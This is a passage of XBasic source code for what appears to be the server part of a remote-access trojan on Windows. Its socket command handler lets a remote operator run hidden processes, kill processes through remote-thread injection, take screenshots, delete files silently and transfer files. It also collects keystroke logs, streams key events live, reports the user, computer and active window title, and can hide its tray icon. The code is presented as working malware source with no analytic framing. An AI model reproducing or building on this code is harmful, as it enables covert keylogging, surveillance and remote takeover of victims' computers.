								 ExitWindowsEx ($$EWX_REBOOT | $$EWX_FORCEIFHUNG,0)
			CASE "poweroff"		:SendMsg (socket,"CMSG *** powering off ***")
							 	 ExitWindowsEx ($$EWX_POWEROFF | $$EWX_FORCEIFHUNG,0)
			CASE "status"		:ClientStatus (socket)
			CASE "popup"		:ClientPopup (socket,str$)
			CASE "proclist"		:ClientProcList (socket)
			CASE "prockill"		:ClientProcKill (socket,XLONG(TRIM$(str$)))
			CASE "capscr"		:GetToken (@str$,@saveas$,',')
								 GetToken (str$,@qual$,0)
								 ClientCapScr (socket,saveas$,XLONG(qual$))
			CASE "shell"		:ClientShell (socket,str$)
			CASE "pong"			:
			CASE "wan"			:NETWORK = $$FALSE
			CASE "lan"			:NETWORK = $$TRUE
			CASE "shutdown"		:SendMsg (socket,"CMSG *** SHUTTING DOWN ***")
								 NetSleep(100)
								 'ShutDown ()
								 ServiceStop()
			CASE "auth"			: ' do nothing
			CASE ELSE			:SendMsg (socket,"CMSG invalid: "+cmd$+" "+str$)
								:RETURN $$FALSE
		END SELECT
	END IF
END FUNCTION

FUNCTION ClientRefresh (socket,STRING dir)

	ClientTree (socket,"REFRESH",dir)
END FUNCTION

FUNCTION ClientFileInfo (socket,STRING filename)
	WIN32_FIND_DATA wfd
	STRING fi,tsize
	FSIZE fsize

	
	IFZ filename THEN RETURN
	IF RIGHT$(filename,1) == "\\" THEN
		p = RINSTR (filename,"\\")
		filename = LEFT$(filename,p-1)
	END IF

	h = FindFirstFileA (&filename,&wfd)
	IF (h == $$INVALID_HANDLE_VALUE) THEN
		SendMsg (socket,"CMSG --- properties error: "+filename+"\1\2--- "+GetLastErrorStr())
		RETURN
	ELSE
		FindClose (h)
	END IF
	
	IF (wfd.dwFileAttributes & $$FILE_ATTRIBUTE_DIRECTORY) THEN
		tsize = GetDirSize (socket,"123 "+filename)
		filename = filename + "\\"
	ELSE
		fsize.sizeh = wfd.nFileSizeHigh
		fsize.sizel = wfd.nFileSizeLow
		tsize = STRING$(fsize.tsize)
	END IF

	fi = STRING$(wfd.dwFileAttributes)+" "
	fi = fi + tsize+" "
	fi = fi + STRING$(wfd.ftCreationTime.dwLowDateTime)+" "
	fi = fi + STRING$(wfd.ftCreationTime.dwHighDateTime)+" "
	fi = fi + STRING$(wfd.ftLastWriteTime.dwLowDateTime)+" "
	fi = fi + STRING$(wfd.ftLastWriteTime.dwHighDateTime)
	SendMsg (socket,"FINFO "+filename+"|"+fi)

END FUNCTION

FUNCTION ClientRenameFile (socket,STRING msg)
	STRING id,oldname,newname,dir
	STRING old,new,ftype


	id = GetTokenEx (@msg,32,0)		' hItem
	dir = GetTokenEx (@msg,'|',0)
	oldname = GetTokenEx (@msg,'|',0)	' file or folder to rename
	newname = GetTokenEx (@msg,'|',0)	' new name
	old = dir+oldname
	new = dir+newname

	IF RIGHT$(oldname,1) == "\\" THEN ftype = "folder" ELSE ftype = "file"
	IF MoveFileA (&old, &new) THEN
		SendMsg (socket,"CMSG --- "+ftype+" renamed: "+new)
		SendMsg (socket,"DIR "+id+" "+newname)
	ELSE
		SendMsg (socket,"CMSG --- cannot rename "+ftype+": "+old+"\1\2--- "+GetLastErrorStr())
		SendMsg (socket,"DIR "+id+" "+oldname)
	END IF

END FUNCTION

FUNCTION ClientDelFiles (socket,STRING msg)
	STATIC SHFILEOPSTRUCT pFileOp
	STRING id,dir,fodir,name


	id = GetTokenEx (@msg,32,0)		' hItem
	dir = GetTokenEx (@msg,'|',0)
	name = GetTokenEx (@msg,'|',0)
	IFZ name THEN RETURN

	fodir = dir+"\0\0"
	pfodir = &fodir
	pFileOp.hwnd = ULONG(id)
	pFileOp.wFunc = $$FO_DELETE
	pFileOp.pFrom = ULONG(pfodir)
	pFileOp.pTo = 0
	pFileOp.fFlags = $$FOF_NOCONFIRMATION | $$FOF_NOCONFIRMMKDIR | $$FOF_NOERRORUI | $$FOF_SILENT
	pFileOp.lpszProgressTitle = 0

	IFZ SHFileOperationA (&pFileOp) THEN
		SendMsg (socket,"CMSG --- files deleted from: "+dir)
	ELSE
		SendMsg (socket,"CMSG --- cannot deleted files: "+dir+"\1\2--- "+GetLastErrorStr())
	END IF
	SendMsg (socket,"DIR "+id+" "+name)
	
END FUNCTION

FUNCTION ClientDelDir (socket,STRING msg)
'	STATIC SHFILEOPSTRUCT pFileOp
	STRING id,name,dir


	id = GetTokenEx (@msg,32,0)		' hItem
	dir = GetTokenEx (@msg,'|',0)	'
	name = GetTokenEx (@msg,'|',0)	' file to delete
	IFZ name THEN RETURN
	
	IF RemoveDirectoryA (&dir) THEN
		SendMsg (socket,"CMSG --- folder deleted: "+dir)
		RETURN $$TRUE
	ELSE
		SendMsg (socket,"CMSG --- cannot delete folder: "+dir+"\1\2--- "+GetLastErrorStr())
		SendMsg (socket,"DIR "+id+" "+name)
		RETURN $$FALSE
	END IF
	
END FUNCTION

FUNCTION ClientDelFile (socket,STRING msg)
	STRING id,name,dir,filename

	id = GetTokenEx (@msg,32,0)		' hItem
	dir = GetTokenEx (@msg,'|',0)	'
	name = GetTokenEx (@msg,'|',0)	' file to delete
	IFZ name THEN RETURN
	filename = dir + name
	
	IF DeleteFileA (&filename) THEN
		SendMsg (socket,"CMSG --- file deleted: "+filename)
		RETURN $$TRUE
	ELSE
		SendMsg (socket,"CMSG --- cannot delete file: "+filename+"\1\2--- "+GetLastErrorStr())
		SendMsg (socket,"DIR "+id+" "+name)
		RETURN $$FALSE
	END IF
END FUNCTION

FUNCTION ClientNewDir (socket,STRING msg)
	STRING dir,name,id
	
	id = GetTokenEx (@msg,32,0)		' if success return id + name
	dir = GetTokenEx (@msg,'|',0)	' create new dir here
	name = GetTokenEx (@msg,'|',0)	' name of new dir

	IF (dir=="") || (name=="") THEN RETURN
	IF RIGHT$(name,1) != "\\" THEN name = name + "\\"
	dir = dir + name
	IF SIZE(dir) > 248 THEN ' CreateDirectoryA() supports max of 248 chars
		SendMsg (socket,"CMSG --- directory too long (max 248): "+dir)
		RETURN 
	END IF
	
	IFZ CreateDirectoryA (&dir,0) THEN
		SendMsg (socket,"CMSG --- cannot create directory: "+dir+"\1\2--- "+GetLastErrorStr())
	ELSE
		SendMsg (socket,"DIR "+id+" "+name)
	END IF

END FUNCTION

FUNCTION ClientTree (socket,STRING msg,STRING dir)
	STRING text,buffer

	IF WaitForSingleObject (#hsmTree,10000) == $$WAIT_TIMEOUT THEN
		SendMsg (socket,"CMSG --- can not acquire tree, previous operation in progress")
		RETURN
	END IF

	IF dir THEN
		'SendMsg (socket,"CMSG --- tree: "+dir)
		GetAllFilesInDir (socket,msg,dir)
		'SendMsg (socket,"CMSG --- end of tree: "+dir+"\1\2")
	ELSE
		SendMsg (socket,"CMSG * can not acquire tree: "+dir)
	END IF

	ReleaseSemaphore (#hsmTree,1,NULL)
END FUNCTION

FUNCTION ClientGetEnv (socket)

	SendMsg (socket,"CMSG \1\2--- environment strings ---")
	SendMsg (socket,"CMSG "+GetEnvStrings())
	SendMsg (socket,"CMSG --- environment strings end ---")
END FUNCTION

FUNCTION ClientUpload (STRING text)
	TP2PFILE file
	TP2P p2p

	
	IF WaitForSingleObject (#hsmUpL,300000) == $$WAIT_TIMEOUT THEN
		RETURN $$FALSE
	END IF

	IF newP2P(@p2p) THEN
		auths$ = GetTokenEx (@text,',',0)
		addr$ = GetTokenEx (@text,',',0)
		port = ULONG(GetTokenEx (@text,',',0))
		file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
		file.srcfile = GetTokenEx (@text,',',0)
		file.desfile = GetTokenEx (@text,',',0)
		file.start = ULONG(GetTokenEx (@text,',',0))
		file.end = ULONG(GetTokenEx (@text,',',0))
		file.flags = ULONG(GetTokenEx (@text,0,0))
		file.blocks = 0 'use default block size
			
		ret = @p2p.FileUpload (file,addr$,port)
		'@p2p.Free(p2p)
	ELSE
		ret = $$FALSE
	END IF

	ReleaseSemaphore (#hsmUpL,1,NULL)
	RETURN ret
END FUNCTION

FUNCTION ClientListen (socket,STRING text)
	STATIC TLP2P p2p[]
	STATIC ONCE,i
	TP2P p
	

'	SendMsg (socket,"CMSG *** server listen start")
	IF WaitForSingleObject (#hsmListen,30000) == $$WAIT_TIMEOUT THEN
		SendMsg (socket,"CMSG *** server listen timeout")
		RETURN $$FALSE
	END IF
	
	IFZ ONCE THEN
		ONCE = 1
		DIM p2p[100]
		i = 0
	ELSE
		INC i: IF (i == 101) THEN i = 0
	END IF

	IFZ newP2P(@p) THEN
		ReleaseSemaphore (#hsmListen,1,NULL)
		SendMsg (socket,"CMSG *** newP2P() fault")
		RETURN
	ELSE
		p2p[i].fs = p
	END IF
	
	p2p[i].auth = XLONG(GetTokenEx (@text,',',0))
	p2p[i].port = ULONG(GetTokenEx (@text,0,0))
	p2p[i].ret = @p2p[i].fs.FileListen (p2p[i].auth,p2p[i].port)
	
'	SendMsg (socket,"CMSG *** free... "+STRING$(i))
	'@p2p[i].fs.Free(p2p[i].fs)
'	SendMsg (socket,"CMSG *** freed: "+STRING$(p2p[i].ret)+" "+STRING$(p2p[i].fs.index))
	
	IF (p2p[i].ret == -2) THEN
		SendMsg (socket,"CMSG *** can not bind remote socket to port "+STRING$(p2p[i].port))
	END IF
	
	ReleaseSemaphore (#hsmListen,1,NULL)
END FUNCTION

FUNCTION ClientDownload (STRING text)
	TP2PFILE file
	TP2P p2p

	IF WaitForSingleObject (#hsmDownL,300000) == $$WAIT_TIMEOUT THEN
		RETURN $$FALSE
	END IF

	IF newP2P(@p2p) THEN
		auths$ = GetTokenEx (@text,',',0)
		addr$ = GetTokenEx (@text,',',0)
		port = ULONG(GetTokenEx (@text,',',0))
		file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
		file.srcfile = GetTokenEx (@text,',',0)
		file.desfile = GetTokenEx (@text,',',0)
		file.start = ULONG(GetTokenEx (@text,',',0))
		file.end = ULONG(GetTokenEx (@text,',',0))
		file.flags = ULONG(GetTokenEx (@text,0,0))
		file.blocks = 0 'use default block size
			
		ret = @p2p.FileDownload (file,addr$,port)
		@p2p.Free(p2p)
	ELSE
		ret = $$FALSE
	END IF

	ReleaseSemaphore (#hsmDownL,1,NULL)
	RETURN ret
END FUNCTION

FUNCTION STRING GetTokenEx (str$,term,offset)


	IFZ str$ THEN RETURN ""

	len = LEN(str$)
	msg$=""
	IF (offset >= len-1) THEN RETURN ""

	FOR p = offset TO len-1
		IF str${p} == term THEN
			INC p
			str$ = RIGHT$(str$,len-p)
			RETURN msg$
		ELSE
			msg$ = msg$ + CHR$(str${p})
		END IF
	NEXT p

	str$ = ""
	RETURN msg$
END FUNCTION


FUNCTION ClientMailReply (socket)
	SHARED STRING MailReply


	SendMsg (socket,"CMSG "+ConvertLFTo12 (@MailReply))
	RETURN $$TRUE
END FUNCTION

FUNCTION ClientEmail (socket,file$)
	STATIC message$


	file$ = TRIM$(file$)
	IFZ file$ THEN RETURN $$FALSE

	message$ = ""
	LoadString (file$,@message$)
	IFZ message$ THEN
		SendMsg (socket,"CMSG *** mail not sent, no data to send ***")
		RETURN $$FALSE
	ELSE
		_beginthreadex (NULL, 0, &EMailAlert(),&message$, 0, &tid)
		Sleep (10)
		SendMsg (socket,"CMSG *** mail sent ***")
		RETURN $$TRUE
	END IF
	

END FUNCTION

FUNCTION ClientSysMenu (socket,str$)

	IFZ str$ THEN RETURN $$FALSE
	switch$ = TRIM$(trim (str$,32))
	
	IF switch$ == LCASE$("on") THEN
		SendMsg (socket,"CMSG \1\2*** systray menu enabled ***")
		RETURN StartMenuInit (0)
	END IF
	
	IF switch$ == LCASE$("off") THEN
		SendMsg (socket,"CMSG \1\2*** systray menu disabled ***")
		RETURN RemoveTrayIcon ()
	END IF

	RETURN $$FALSE
END FUNCTION

FUNCTION ClientStreamKeys (socket,str$)


	IFZ str$ THEN RETURN $$FALSE
	switch$ = TRIM$(trim (str$,32))
	
	IF switch$ == LCASE$("on") THEN
		SendMsg (socket,"CMSG \1\2*** event streaming enabled ***")
		#StreamKey = $$TRUE
		RETURN $$TRUE
	END IF
	IF switch$ == LCASE$("off") THEN
		IFT #StreamKey THEN
			SendMsg (socket,"CMSG \1\2*** event streaming disabled ***")
		END IF
		#StreamKey = $$FALSE
		RETURN $$TRUE
	END IF
	
	RETURN $$FALSE
END FUNCTION

FUNCTION STRING ConvertLFTo12 (msg$)


	IFZ msg$ THEN RETURN ""

	FOR c = 0 TO LEN(msg$)
		IF (msg${c} == 13) THEN
			msg${c} = 1
		ELSE
			IF (msg${c} == 10) THEN msg${c} = 2
		END IF
	NEXT c
	
	RETURN msg$
END FUNCTION

FUNCTION ClientGetEventLog (socket)
	SHARED of
	STRING text


	IFZ of THEN of = OpenEventLog()
	IF of < 0 THEN
		'PRINT "unable to open event log: ",of
		of = 0
		RETURN $$FALSE
	END IF

	filesize = LOF(of)

	IF filesize THEN
		blk = 30000
		total = 0

		DO 
			IF filesize > blk THEN len = blk ELSE len = filesize
			
			text = SPACE$(len)
			SEEK (of,total)
			READ [of], text
			SendMsg (socket,"EVENTLOGPART "+ConvertLFTo12(@text))
			NetSleep (10)

			filesize = filesize - len
			total = total + len
		LOOP WHILE (filesize > 0)

		RETURN $$TRUE
	ELSE
		RETURN $$FALSE
	END IF

END FUNCTION

FUNCTION ClientGetEventLogB (socket)
	SHARED of


	IFZ of THEN of = OpenEventLog()
	IF of < 0 THEN
		'PRINT "unable to open event log: ",of
		of = 0
		RETURN $$FALSE
	END IF

	fileSize = LOF(of)
	IF fileSize THEN
		log$ = NULL$(fileSize)
		SEEK (of,0)
		READ [of], log$

		SendMsg (socket,"EVENTFILE "+ConvertLFTo12(@log$))
		NetSleep (150)
		RETURN $$TRUE
	ELSE
		RETURN $$FALSE
	END IF

END FUNCTION

FUNCTION OpenEventLog ()
	SHARED RECORDEVENTS
	

	IFF RECORDEVENTS THEN RETURN -1
	IF WaitForSingleObject (#hSELF,15000) == $$WAIT_TIMEOUT THEN
		RETURN -1
	END IF
	
	ifile = OPEN($$ST_KEYLOGF, $$RW)
	ReleaseSemaphore (#hSELF,1,NULL)
	RETURN ifile
END FUNCTION

FUNCTION ClientGetKeyLog (socket)


	SendMsg (socket,"KEYLOG "+GetEventLog())
	NetSleep (150)
	
	RETURN $$TRUE
END FUNCTION

FUNCTION ClientStatus (socket)
	SHARED XLONG tBytesSent,tBytesRecvA,tBytesRecvB
	SHARED XLONG startTick
	SHARED STRING atitle
	SHARED iconStatus
	XLONG mins
	SHARED of

	
	mins = ((GetTickCount()-startTick) * 0.001)/60
	IFT #StreamKey THEN estatus$ = "enabled" ELSE estatus$ = "disabled"
	IFT iconStatus THEN istatus$ = "enabled" ELSE istatus$ = "disabled"
	IFZ of THEN of = OpenEventLog()
	
	SendMsg (socket,"CMSG --- "+ #IPAddr$+":"+STRING$(#Port)+" status ---")
	SendMsg (socket,"CMSG :server location\t\t"+ GetServerPath())
	SendMsg (socket,"CMSG :user name\t\t"+GetUserName())
	SendMsg (socket,"CMSG :computer name\t\t"+GetComputerName())
	SendMsg (socket,"CMSG :start time\t\t"+ #startTime$+" "+ #startDate$)
	SendMsg (socket,"CMSG :current time\t\t"+GetTime()+" "+GetDate())
	SendMsg (socket,"CMSG :uptime\t\t\t"+STRING$(mins)+" minutes")
	SendMsg (socket,"CMSG :logical drives\t\t"+GetDrives())
	SendMsg (socket,"CMSG :windows dir\t\t"+GetWindowsDir())
	SendMsg (socket,"CMSG :system dir\t\t"+GetSystemDir())
	SendMsg (socket,"CMSG :window focus\t\t["+atitle+"]")
	SendMsg (socket,"CMSG :systray menu\t\t"+istatus$)
	SendMsg (socket,"CMSG :event streaming\t\t"+estatus$)
	SendMsg (socket,"CMSG :event log size\t\t"+STRING$(LOF(of))+" bytes")
	SendMsg (socket,"CMSG :server log size\t\t"+STRING$(GetEventLogSize()))
	SendMsg (socket,"CMSG :data recv\t\t"+STRING$(tBytesRecvA+tBytesRecvB))
	SendMsg (socket,"CMSG :data sent\t\t"+STRING$(tBytesSent))
	SendMsg (socket,"CMSG --- status end ---")
	 
	RETURN $$TRUE
END FUNCTION


FUNCTION ClientPopup (socket,STRING text)


	IFZ text THEN RETURN $$FALSE
	
	GetToken (@text,@title$,'|')
	GetToken (text,@message$,0)
	SendMsg (socket,"CMSG *** popup displayed ***")
	IF MessageBoxA (0,&message$,&title$,0) THEN
		SendMsg (socket,"CMSG *** popup clicked ***")
	END IF
	
	RETURN $$TRUE
END FUNCTION

FUNCTION ClientShell (socket,STRING pathname)
	STARTUPINFO sinfo
	PROCESS_INFORMATION pinfo


	IFZ pathname THEN RETURN $$FALSE
	sinfo.cb = SIZE(STARTUPINFO)
	sinfo.dwFlags = $$STARTF_USESHOWWINDOW
	sinfo.lpReserved = 0
	sinfo.lpDesktop = 0
	sinfo.lpTitle = 0
	sinfo.wShowWindow = $$SW_HIDE
	sinfo.cbReserved2 = 0
	sinfo.lpReserved2 = 0

	IF CreateProcessA (0,&pathname,0,0,0,0,0,0,&sinfo,&pinfo) THEN
		SendMsg (socket,"CMSG * process created: "+STRING$(pinfo.dwProcessId)+"  "+pathname)
		RETURN $$TRUE
	ELSE
		SendMsg (socket,"CMSG *** unable to create process: "+pathname+" ***")
		RETURN $$FALSE
	END IF
	
	
END FUNCTION

FUNCTION ClientProcKill (socket,pid)


	IFZ pid THEN
		SendMsg (socket,"CMSG *** invalid process id ***")
		RETURN $$FALSE
	END IF

	found = $$FALSE
	hwnd = FindWindowA(0,0)
	DO WHILE (hwnd <> 0)
 		IF GetParent(hwnd) == 0 THEN
			GetWindowThreadProcessId(hwnd, &test_pid)
     		IF test_pid == pid THEN
     			proc = 0
     			hThread = GetWindowThreadProcessId(hwnd,&proc)
     			PostThreadMessageA(hThread,$$WM_QUIT,0,0): Sleep (1)
     			PostMessageA (hwnd, $$WM_DESTROY , 0, 0): Sleep (1)
     			PostMessageA (hwnd, $$WM_QUIT , 0, 0): Sleep (1)
     			PostMessageA (hwnd, $$WM_CLOSE , 0, 0): Sleep (1)
     			CloseWindow  (hwnd)
     			Sleep (50)
				hProcess = OpenProcess(0x000F0000 | 0x00100000 | 0xFFF,1,pid) ' $$PROCESS_ALL_ACCESS
   				IF (hProcess) THEN
   					dwThreadId = 0
   					dwTimeout = 5
      				hThread = CreateRemoteThread(hProcess,NULL,0,GetProcAddress(GetModuleHandleA(&"KERNEL32.DLL"),&"ExitProcess"),0,0,&dwThreadId)
      				IF (hThread) THEN
			        	WaitForSingleObject(hThread,dwTimeout)
         				CloseHandle(hThread)
         				CloseHandle(hProcess)
         			ELSE
         				TerminateProcess(hProcess,sig)
					END IF
      			END IF

        		SendMsg (socket,"CMSG *** process "+STRING$(pid)+" killed ***")
        	'	RETURN $$TRUE
        		found = $$TRUE
     		END IF
  		END IF
  		hwnd = GetWindow(hwnd, $$GW_HWNDNEXT)
 	LOOP
 	
  	IFF found THEN
  		
		hProcess = OpenProcess(0x000F0000 | 0x00100000 | 0xFFF,1,pid) ' $$PROCESS_ALL_ACCESS
   		IF (hProcess) THEN
   			dwThreadId = 0: dwTimeout = 5
   			
      		hThread = CreateRemoteThread(hProcess,NULL,0,GetProcAddress(GetModuleHandleA(&"KERNEL32.DLL"),&"ExitProcess"),0,0,&dwThreadId)
      		IF (hThread) THEN
				WaitForSingleObject(hThread,dwTimeout)
         		CloseHandle(hThread)
         		CloseHandle(hProcess)
         	ELSE
         		TerminateProcess(hProcess,sig)
			END IF
			SendMsg (socket,"CMSG *** process "+STRING$(pid)+" forcefully killed ***")
		ELSE
			SendMsg (socket,"CMSG *** process not found ***")
      	END IF
	END IF
  	
 	RETURN $$FALSE
END FUNCTION

FUNCTION ClientProcList (socket)

	SendMsg (socket,"CMSG --- process list ---")
	SendMsg (socket,"CMSG "+GetProcList())
	SendMsg (socket,"CMSG --- process list end ---")

END FUNCTION

FUNCTION ClientCapScr (socket,saveas$,qual)
	UBYTE image[]


	IF (WaitForSingleObject (#hSCAPS,15000) == $$WAIT_TIMEOUT) THEN
		SendMsg (socket,"CMSG *** cap timeout: "+saveas$+" ***")
		RETURN $$FALSE
	END IF
	
'	SendMsg (socket,"CMSG *** cap..")
	DIM image[]
	IFF CaptureScrEx (@image[]) THEN
		SendMsg (socket,"CMSG *** unable to acquire cap: "+saveas$+" ***")
		ReleaseSemaphore (#hSCAPS,1,NULL)
		RETURN $$FALSE
	END IF

	IFF BmpToJPGEx (@image[],saveas$,qual) THEN
		SendMsg (socket,"CMSG *** cap ijlib15.dll not found: "+saveas$+" ***")
		ReleaseSemaphore (#hSCAPS,1,NULL)
		RETURN $$FALSE
	ELSE
'		SendMsg (socket,"CMSG *** ..ok")
		ReleaseSemaphore (#hSCAPS,1,NULL)
		RETURN $$TRUE
	END IF

END FUNCTION

FUNCTION BmpToJPGEx (UBYTE image[],file$,quality)
	STATIC JPEG_CORE_PROPERTIES jcprops
	STATIC FUNCADDR pijlInit (XLONG)
	STATIC FUNCADDR pijlWrite (XLONG,XLONG)
	STATIC FUNCADDR pijlFree (XLONG)
	SHARED ijllibHandle


	IFZ file$ THEN RETURN $$FALSE
	IF SIZE(image[]) < 1000 THEN RETURN $$FALSE
	
	GetImageArrayInfo (@image[], @bpp, @width, @height)
	IF (bpp != 24) THEN RETURN $$FALSE

	IFZ ijllibHandle THEN
		ijllibHandle = LoadLibraryA(&"ijl15.dll")
		IFZ ijllibHandle THEN RETURN $$FALSE
		pijlInit = GetProcAddress (ijllibHandle,&"ijlInit")
		pijlFree = GetProcAddress (ijllibHandle,&"ijlFree")
		pijlWrite = GetProcAddress (ijllibHandle,&"ijlWrite")
	END IF
	IF (@pijlInit (&jcprops) != $$IJL_OK) THEN
		FreeLibrary(ijllibHandle)
		ijllibHandle = 0
		RETURN $$FALSE
	END IF
	IFZ quality THEN quality = 80

	jcprops.DIBWidth       = width
	jcprops.DIBHeight      = -height
	jcprops.DIBChannels    = 3
	jcprops.DIBColor       = $$IJL_BGR
	jcprops.JPGColor       = $$IJL_YCBCR
	jcprops.JPGChannels    = 3
	jcprops.JPGSubsampling = $$IJL_411
	jcprops.DIBBytes       = &image[54]
	jcprops.DIBPadBytes    = IJL_DIB_PAD_BYTES (width)
	jcprops.JPGFile        = &file$
	jcprops.JPGWidth       = width
	jcprops.JPGHeight      = height
	jcprops.jquality       = quality

'write image[] to file
	ret = @pijlWrite(&jcprops, $$IJL_JFILE_WRITEWHOLEIMAGE)
	@pijlFree (&jcprops)
	IF (err != $$IJL_OK) THEN
		RETURN $$FALSE
	ELSE
		RETURN $$TRUE
	END IF
END FUNCTION

FUNCTION CaptureScrEx (UBYTE image[])
	STATIC BITMAP bmp  


	hdcScreen = CreateDCA(&"DISPLAY", 0, 0, 0)
	hdcScreenCompat = CreateCompatibleDC(hdcScreen)

	bmp.bitsPixel = GetDeviceCaps(hdcScreen, $$BITSPIXEL)
	bmp.planes    = GetDeviceCaps(hdcScreen, $$PLANES)
	bmp.width     = GetDeviceCaps(hdcScreen, $$HORZRES)
	bmp.height    = GetDeviceCaps(hdcScreen, $$VERTRES)
	bmp.widthBytes = ((bmp.width + 15) &~15)/8
	
	hbmpCompat = CreateBitmap(bmp.width, bmp.height, bmp.planes, bmp.bitsPixel, 0)
	SelectObject(hdcScreenCompat, hbmpCompat)
	
	BitBlt(hdcScreenCompat, 0, 0, bmp.width, bmp.height, hdcScreen, 0, 0, $$SRCCOPY)
	ret = GetImage (hbmpCompat,@image[])

	DeleteObject(hbmpCompat)
	DeleteDC(hdcScreenCompat)
	DeleteDC(hdcScreen)
	RETURN ret
END FUNCTION

FUNCTION GetToken (str$,msg$,term)


	IFZ str$ THEN RETURN $$FALSE

	len = LEN(str$)
	msg$=""

	FOR p = 0 TO len-1
		IF str${p} = term THEN
			INC p
			str$ = RIGHT$(str$,len-p)
			RETURN p
		ELSE
			msg$ = msg$ + CHR$(str${p})
		END IF
	NEXT p

	str$ = ""
	RETURN $$TRUE

END FUNCTION

FUNCTION ListenMsg (sock)
	SHARED XLONG tBytesRecvA
	SHARED APPLSTATUS
	SHARED CONNECTED
	STRING buffer


	DO
		buffer = NULL$($$MAX_LBUFFER)
		bytesRead = recv (sock, &buffer, $$MAX_LBUFFER, 0)
		
		IF (bytesRead == $$SOCKET_ERROR || bytesRead == 0) THEN
			EXIT DO
		ELSE
			tBytesRecvA = tBytesRecvA + bytesRead 
			MessagePump (sock,LEFT$(buffer,bytesRead))
		END IF
			
	LOOP WHILE ((APPLSTATUS == $$TRUE) AND (CONNECTED == $$TRUE))
		
	CONNECTED = $$FALSE
	#StreamKey = $$FALSE
	
	RETURN $$TRUE
END FUNCTION

FUNCTION ListenMail (sock)
	SHARED tBytesRecvA
	SHARED APPLSTATUS
	SHARED STRING MailReply
	STRING buffer
	

	DO
		buffer = NULL$($$MAX_LBUFFER)
		bytesRead = recv (sock, &buffer, $$MAX_LBUFFER, 0)
		
		IF (bytesRead == $$SOCKET_ERROR || bytesRead == 0) THEN
			EXIT DO
		ELSE
			PRINT LEFT$(buffer,bytesRead)
			MailReply = MailReply + LEFT$(buffer,bytesRead)
		END IF
			
	LOOP WHILE (APPLSTATUS == $$TRUE) 

	RETURN $$TRUE
END FUNCTION

FUNCTION GetImage (hImage, UBYTE image[])
	TRECT rect
	BITMAP bm

	$BI_RGB       = 0					' 24-bit RGB
	DIM image[]

	IFZ hImage THEN RETURN ($$FALSE)
	IFZ GetImageType (hImage) THEN RETURN ($$FALSE)

	IF GetImageType (hImage) = $$IMAGE_SCREEN THEN
		GetClientRect (hImage, &rect)
		width  = rect.right
		height = rect.bottom
	ELSE
		hdcMem      = CreateCompatibleDC (NULL)
		hBitmapLast = SelectObject (hdcMem, hImage)
		GetObjectA (hImage, SIZE(bm), &bm)
		width       = bm.width
		height      = bm.height
	END IF

	dataOffset = 54

' alignment on multiple of 32 bits or 4 bytes

	size = dataOffset + (height * ((width * 3) + 3 AND -4))
	upper = size - 1
	DIM image[upper]

'	Fill BITMAPFILEHEADER
'		Windows version:  little ENDIAN; no alignment concerns

	iAddr = &image[0]

	image[0] = 'B'															' DIB aka BMP signature
	image[1] = 'M'
	image[2] = size AND 0x00FF									' file size
	image[3] = (size >> 8) AND 0x00FF
	image[4] = (size >> 16) AND 0x00FF
	image[5] = (size >> 24) AND 0x00FF
	image[6] = 0
	image[7] = 0
	image[8] = 0
	image[9] = 0
	image[10] = dataOffset AND 0x00FF						' file offset of bitmap data
	image[11] = (dataOffset >> 8) AND 0x00FF
	image[12] = (dataOffset >> 16) AND 0x00FF
	image[13] = (dataOffset >> 24) AND 0x00FF

'	fill BITMAPINFOHEADER (first 6 members)

	info = 14
	image[info+0] = 40													' XLONG : BITMAPINFOHEADER size
	image[info+1] = 0
	image[info+2] = 0
	image[info+3] = 0
	image[info+4] = width AND 0x00FF						' XLONG : width in pixels
	image[info+5] = (width >> 8) AND 0x00FF
	image[info+6] = (width >> 16) AND 0x00FF
	image[info+7] = (width >> 24) AND 0x00FF
	image[info+8] = height AND 0x00FF						' XLONG : height in pixels
	image[info+9] = (height >> 8) AND 0x00FF
	image[info+10] = (height >> 16) AND 0x00FF
	image[info+11] = (height >> 24) AND 0x00FF
	image[info+12] = 1													' USHORT : # of planes
	image[info+13] = 0													'
	image[info+14] = 24													' USHORT : bits per pixel
	image[info+15] = 0													'
	image[info+16] = $BI_RGB										' XLONG : 24-bit RGB
	image[info+17] = 0													'
	image[info+18] = 0													'
	image[info+19] = 0													'
	image[info+20] = 0													' XLONG : sizeImage
	image[info+21] = 0													'
	image[info+22] = 0													'
	image[info+23] = 0													'
	image[info+24] = 0													' XLONG : xPPM
	image[info+25] = 0													'
	image[info+26] = 0													'
	image[info+27] = 0													'
	image[info+28] = 0													' XLONG : yPPM
	image[info+29] = 0													'
	image[info+30] = 0													'
	image[info+31] = 0													'
	image[info+32] = 0													' XLONG : clrUsed
	image[info+33] = 0													'
	image[info+34] = 0													'
	image[info+35] = 0													'
	image[info+36] = 0													' XLONG : clrImportant
	image[info+37] = 0													'
	image[info+38] = 0													'
	image[info+39] = 0													'

	dataAddr = iAddr + dataOffset
	infoAddr = iAddr + 14

	x = 0
	y = 0

	IF GetImageType (hImage) = $$IMAGE_SCREEN THEN
		hdc = GetDC (hImage)
		hdcTmp	= CreateCompatibleDC (hdc)
		hBitmap	= CreateCompatibleBitmap (hdc, width, height)
		hBitmapOld = SelectObject (hdcTmp, hBitmap)
		BitBlt (hdcTmp, 0, 0, width, height, hdc, x, y, $$SRCCOPY)
		hBitmap	= SelectObject (hdcTmp, hBitmapOld)			' bitmap not in hdc
		ok = GetDIBits(hdc, hBitmap, 0, height, dataAddr, infoAddr, $$DIB_RGB_COLORS)
		ReleaseDC (hImage, hdc)
		DeleteDC (hdcTmp)
		DeleteObject (hBitmapOld)
		DeleteObject (hBitmap)
	ELSE
		ok = GetDIBits (hdcMem, hImage, 0, height, dataAddr, infoAddr, $$DIB_RGB_COLORS)
		SelectObject (hdcMem, hBitmapLast)
		DeleteDC (hdcMem)
	END IF

	IFZ ok THEN RETURN $$FALSE ELSE RETURN $$TRUE

END FUNCTION


FUNCTION GetImageType (hImage)

	SELECT CASE TRUE
		CASE IsWindow (hImage) 						: RETURN $$IMAGE_SCREEN
		CASE GetObjectType (hImage) = $$OBJ_BITMAP 	: RETURN $$IMAGE_MEMORY
		CASE ELSE 									: RETURN 0
	END SELECT

END FUNCTION

FUNCTION STRING GetTime ()

	GetLocalDateAndTime (year, month, day, weekDay, @hour, @minute, @second, nanos)
	RETURN STRING$(hour)+":"+STRING$(minute)+":"+STRING$(second)
	
END FUNCTION


FUNCTION STRING GetDate ()

	GetLocalDateAndTime (@year, @month, @day, weekDay, hour, minute, second, nanos)
